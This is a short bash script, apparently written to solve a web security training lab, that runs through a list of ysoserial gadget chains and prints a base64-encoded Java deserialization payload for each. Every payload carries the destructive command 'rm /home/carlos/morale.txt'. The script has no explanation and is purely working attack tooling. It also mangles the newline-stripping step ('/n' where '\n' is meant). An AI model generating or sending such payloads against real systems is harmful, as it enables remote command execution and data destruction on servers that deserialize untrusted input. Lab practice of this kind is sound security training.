#!/bin/bash

for i in $( cat ysoserial)
do
java -jar ysoserial-master-8eb5cbfbf6-1.jar $i 'rm /home/carlos/morale.txt' | base64 | tr -d "/n" > d.txt
awk '{print $1}' d.txt
done

